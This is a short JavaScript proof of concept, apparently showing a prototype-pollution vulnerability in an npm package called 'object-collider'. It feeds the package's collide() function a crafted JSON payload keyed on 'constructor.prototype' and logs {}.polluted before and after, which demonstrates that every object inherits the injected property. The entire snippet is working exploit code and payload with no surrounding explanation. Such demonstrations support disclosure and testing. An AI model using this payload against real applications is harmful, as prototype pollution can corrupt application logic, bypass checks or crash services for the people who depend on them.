var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var {collide} = require('object-collider');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
collide(obj, payload);
console.log({}.polluted);